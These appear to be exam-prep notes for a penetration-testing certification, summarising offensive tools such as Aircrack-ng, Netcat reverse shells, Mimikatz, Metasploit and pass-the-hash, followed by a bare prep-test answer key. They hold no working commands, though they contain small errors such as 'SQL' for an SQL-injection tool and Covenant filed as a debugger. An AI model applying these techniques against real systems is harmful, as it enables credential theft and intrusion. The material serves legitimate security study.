» The Aircrack-ng suite contains tools to monitor wireless traffic, crack wireless encryption keys, and to set up an evil twin attack. Kismet is a wireless scanner available with Kali Linux and Wifite is a tool you can use to automate a wireless attack. Review Chapter 6 to refresh your memory on wireless tools and their output. 

» SET and BeEF are tools you can use for social engineering attacks, while Netcat (nc.exe) and the newer version, Ncat (ncat.exe), can be used to bind to a shell or set up a reverse shell. 

» You can use the hashdump command to retrieve the password hashes off a compromised system and then use those hashes in a pass the hash attack, which essentially allows you to authenticate to a system by using the password hash instead of the clear-text password.

#

## Prep Test

1. B
2. D
3. C
4. A
5. D
6. B
7. C, E 
8. A
9. B
10. C
11. D



#

## For the Exam

- Fuzzing = sending altered input into application to test how it handles different forms of input.
- Nikto = Web app vuln scanner
- SQL = Automated SQLi attack tool
- Nessus = System vuln scanner use to identify weaknesses in a product.
- SCAP = Security scanner deteremines compliance of a system based on benchmark fed into tool.
- WPScan = used to identify vuln in WordPress site
- Scout Suite = used to assess security of cloud-based environment.
- Hashcat, Medusa, Hydra = example of password-cracking tools on Linux.
- John the Ripper and Cain and Abel = Password cracking tools
- Mimikatz is post-exploitation tool that can be used to steal password after gaining admin access to the system.
- Know debugger: OllyDbg, Immunity Debugger, GDB, WinDbg, IDA, Covenant.
- Know Software-Assurance tools: Findbugs/find-sec-bugs, peach fuzzer, AFL, SonarQube, YASCA
- theHarvester, Maltego, Recon-ng = OSINT tools that used to collect info about Org from different source on Internet.
- Know the command in Aircrack-ng suite.
- Be familiar with purpose of Kismet and Wifite.
- OWASP ZAP and Burp Suite = Web proxies
- OWASP ZAP, Burp Suite and Nikto = Tools that can test website for vuln.
- SET and BeEF = social engineering tools that can be used to compromise a system.
- Netcat (nc.exe) and Ncat (ncat.exe) can be used to set up listener then connect to that listener later for remote access or to send files.
- Wrieshark can be ued to perform eavesdrop attack
- hping3 used to craft your own ping messages and customize characteristics of packet.
- Metasploit Framework has number of exploit built in that you can execute to gain access to unsecure systems.
- Responder = tool that responds to NetBIOS name service queries and can be ued to capture password hashes on network.
- Pass the hash refers to technique of exploiting one system to obtain a list of password hashes, then using those hashes to connect to another system instead of trying to crack the password hashes.
- 
